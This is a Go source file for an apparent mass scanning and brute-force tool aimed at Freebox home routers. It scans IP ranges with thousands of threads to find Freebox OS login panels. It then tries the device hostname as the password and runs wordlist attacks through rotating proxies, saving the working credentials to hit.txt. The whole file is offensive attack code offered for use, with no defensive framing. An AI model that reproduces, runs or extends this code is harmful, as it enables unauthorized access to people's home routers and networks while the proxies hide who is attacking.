package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/0xF7A4C6/GoCycle"
	"github.com/0xF7A4C6/freebruter/internal/console"
	"github.com/0xF7A4C6/freebruter/internal/freebox"
	"github.com/0xF7A4C6/freebruter/internal/utils"
	"github.com/korylprince/ipnetgen"
	"github.com/valyala/fasthttp/fasthttpproxy"
	"github.com/zenthangplus/goccm"
)

const (
	FreeboxOSIdentification = "Freebox OS :: Identification"
)

var (
	ports                       = []int{80}
	checked, found, hit, errors int
	pass                        = []string{}
	p                           *GoCycle.Cycle
)

// Bruteforce login using wordlist
func bruteUrl(url string) {
	box := freebox.NewFreeboxClient(url, func(addr string) (net.Conn, error) {
		pp, _ := p.Next()
		go p.LockByTimeout(pp, time.Duration(time.Second*3))
		return fasthttpproxy.FasthttpHTTPDialer(pp)(addr)
	})

	for _, p := range pass {
		c, err := box.GetChallenge()
		if err != nil {
			fmt.Println(err)
			break
		}

		time.Sleep(10000 * time.Millisecond)
		password := p

		r, err := box.Login(box.GetHash(password, c.Result.PasswordSalt, box.SolveChallenge(c)))
		if err != nil {
			fmt.Println(err)
			break
		}

		if !r.Success {
			console.Log(fmt.Sprintf("[INVALID] %s (%s - %s, %s)", url, password, r.Msg, r.ErrorCode))

			if r.ErrorCode == "invalid_api_version" {
				break
			}

			continue
		}

		found++
		console.Log(fmt.Sprintf("[FOUND] %s (%s)", url, password))
		utils.AppendFile("hit.txt", fmt.Sprintf("%s:%s", url, password))
	}
}

// Test url by using freebox name as password
func testUrl(url string) {
	box := freebox.NewFreeboxClient(url, func(addr string) (net.Conn, error) {
		pp, _ := p.Next()
		go p.LockByTimeout(pp, time.Duration(time.Second*3))
		return fasthttpproxy.FasthttpHTTPDialer(pp)(addr)
	})

	c, err := box.GetChallenge()
	if err != nil {
		fmt.Println(err)
		return
	}

	password := strings.Split(strings.Split(url, "://")[1], ".freeboxos.fr")[0]

	r, err := box.Login(box.GetHash(password, c.Result.PasswordSalt, box.SolveChallenge(c)))
	if err != nil {
		fmt.Println(err)
		return
	}

	if !r.Success {
		console.Log(fmt.Sprintf("[INVALID] %s (%s - %s, %s)", url, password, r.Msg, r.ErrorCode))
		return
	}

	found++
	console.Log(fmt.Sprintf("[FOUND] %s (%s)", url, password))
	utils.AppendFile("hit.txt", fmt.Sprintf("%s:%s", url, password))
}

func IsFreebox(ip string) {
	type Result struct {
		URI    string
		Status int
		Title  string
	}

	results := make(chan Result, len(ports))
	var wg sync.WaitGroup

	for _, port := range ports {
		wg.Add(1)

		go func(ip string, port int) {
			defer wg.Done()

			timeout := time.Millisecond * 400
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, fmt.Sprintf("%d", port)), timeout)
			if err != nil {
				errors++
				return
			}
			conn.Close()

			u := fmt.Sprintf("http://%s", net.JoinHostPort(ip, fmt.Sprintf("%d", port)))
			req, err := http.NewRequest("GET", u, nil)
			if err != nil {
				errors++
				return
			}

			client := &http.Client{
				Timeout: time.Second,
			}

			resp, err := client.Do(req)
			if err != nil {
				errors++
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				errors++
				return
			}

			title := ""
			re := regexp.MustCompile(`<title>(.*?)</title>`)
			match := re.FindStringSubmatch(string(body))
			if len(match) > 1 {
				title = strings.ReplaceAll(strings.TrimSpace(match[1]), "\n", "")
			}

			results <- Result{
				URI:    resp.Request.URL.String(),
				Status: resp.StatusCode,
				Title:  title,
			}
		}(ip, port)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		if result.Title != FreeboxOSIdentification {
			console.Log(fmt.Sprintf("[NOP] [%d] %s (%s)", result.Status, strings.ReplaceAll(result.URI, "\n", ""), result.Title))
			continue
		}

		console.Log(fmt.Sprintf("[HIT] [%d] %s (%s)", result.Status, strings.ReplaceAll(result.URI, "\n", ""), result.Title))
		utils.AppendFile("found_pannel.txt", result.URI)

		if strings.Contains(result.URI, "freeboxos") {
			go testUrl(strings.Split(result.URI, "/login.php")[0])
		}
		hit++
		break
	}
}

func titleThread() {
	startTime := time.Now()

	for {
		time.Sleep(time.Millisecond)

		elapsedMinutes := int(time.Since(startTime).Seconds())

		checkedCPM := 0
		if elapsedMinutes > 0 {
			checkedCPM = checked / elapsedMinutes
		} else {
			checkedCPM = checked
		}

		console.SetTitle(fmt.Sprintf("checked: %d, found: %d, hit: %d, error: %d, CPS: %d, CPM: %d", checked, found, hit, errors, checkedCPM, checkedCPM*60))
	}
}

func scan() {
	threads := goccm.New(2000)
	go titleThread()

	cidr, err := utils.ReadFile("asn.txt")
	if err != nil {
		panic(err)
	}

	for _, subnet := range cidr {
		gen, err := ipnetgen.New(subnet)
		if err != nil {
			panic(err)
		}

		fmt.Println(subnet)
		for ip := gen.Next(); ip != nil; ip = gen.Next() {
			threads.Wait()

			go func(address string) {
				defer threads.Done()
				IsFreebox(address)
				checked++
			}(ip.String())
		}
	}

	threads.WaitAllDone()
}

func brute() {
	p, _ = GoCycle.NewFromFile("../../assets/proxies.txt")

	threads := goccm.New(2000)
	go titleThread()

	pannel, err := utils.ReadFile("found_pannel.txt")
	if err != nil {
		panic(err)
	}

	pass, _ = utils.ReadFile("wordlist.txt")

	for _, addr := range pannel {
		threads.Wait()

		go func(address string) {
			defer threads.Done()
			bruteUrl(strings.Split(address, "/login.php")[0])
			checked++
		}(addr)
	}

	threads.WaitAllDone()
}

func main() {
	os.Args = os.Args[1:]

	switch os.Args[0] {
	case "brute":
		brute()
	case "scan":
		scan()
	}
}
